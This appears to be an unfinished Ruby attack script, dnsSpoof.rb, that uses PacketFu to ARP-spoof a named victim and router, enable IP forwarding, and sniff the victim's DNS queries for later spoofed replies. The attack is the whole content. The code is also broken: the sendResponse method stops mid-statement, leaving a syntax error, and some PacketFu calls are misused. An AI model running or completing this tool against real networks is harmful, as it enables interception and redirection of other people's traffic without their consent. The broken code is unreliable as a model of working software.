=begin
 File: dnsSpoof.rb
 Author: Luke Queenan
=end

# Gems
require 'rubygems'
require 'packetfu'

# Files
require './arpSpoof.rb'

# Includes so we don't have to use fully qualified class names
include PacketFu

class DnsSpoof
    
    # Initialize the variables and information
    def initialize (routerIP, victimIP, interface)
        
        # Check for values
        if routerIP == nil || victimIP == nil || interface == nil
            fatalError(")Usage: routerIP victimIP interface\n")
        end
        
        # Store global info
        @routerIP = routerIP
        @victimIP = victimIP
        @interface = interface
        
        # Get the MAC address of the router
        @routerMAC = Utils.arp(routerIP, :iface => @interface)
        if @routerMAC == nil
            fatalError("Unable to get router MAC")
        end
        
        # Get the MAC address of the victim
        @victimMAC = Utils.arp(victimIP, :iface => @interface)
        if @victimMAC == nil
            fatalError("Unable to get victim MAC")
        end
        
        # Get our information
        # TODO: CHANGE THIS TO ifconfig
        @ourInfo = Utils.whoami?(:iface => interface)
        
        # Enable IP forwarding based on the OS (Linux or OS X)
        DnsSpoof.forward(true);
    end
    
    def main
        
        # Create the ARP Spoofing process
        @pid = fork do
            # Ensure that we shut down the child cleanly
            Signal.trap("INT") { DnsSpoof.forward(false); exit }
            arp = ArpSpoof.new(@routerIP, @routerMAC, @victimIP, @victimMAC,
                               @interface, @ourInfo)
            arp.main
        end
        
        # Make sure we shut down cleanly
        Signal.trap("SIGINT") { Process.kill("INT", @pid); Process.wait; exit }
        
        # Start DNS portion of program
        sniffPackets
        
    end

private    
    
    def sniffPackets
        
        # Start the capture process
        capture = Capture.new(:iface => @interface, :start => true,
                                        :promisc => true,
                                        :filter => "udp and port 53",
                                        :save => true)
        
        # Find the DNS packets
        capture.stream.each do |pkt|
            if Packet.has_data?
                packet = Packet.parse(pkt)
                
                # Make sure we have a query packet
                if packet.payload[2] == 1 && packet.payload[3] == 0
                    domainName = getDomainName(packet)
                    puts domainName
                end
            end
        end
    end
    
    def sendResponse
        
        # Create the UDP packet
        response = UDPPacket.new(
    end
    
    def getDomainName(packet)
        domainName = ""
        count = 13
        while count < 100
            if packet.payload[count].to_s(base = 16).hex.chr == "\003"
                domainName += "."
            elsif packet.payload[count].to_s(base = 16).hex.chr == "\000"
                return domainName
            else
                domainName += packet.payload[count].to_s(base = 16).hex.chr
            end
            
            count += 1
        end
    end

    # Function for enabling packet forwarding based on OS type (OS X and Linux)
    def DnsSpoof.forward(forward)
        
        if RUBY_PLATFORM =~ /darwin/
            if forward then
                `sysctl -w net.inet.ip.forwarding=1`
            end
            
            if !forward then
                `sysctl -w net.inet.ip.forwarding=0`
            end
        else
            if forward then
                `echo 1 > /proc/sys/net/ipv4/ip_forward`
            end
            
            if !forward then
                `echo 0 > /proc/sys/net/ipv4/ip_forward`
            end
        end
    end
        
    def fatalError(message)
        puts message
        exit
    end
end

spoof = DnsSpoof.new(ARGV[0], ARGV[1], ARGV[2])
spoof.main
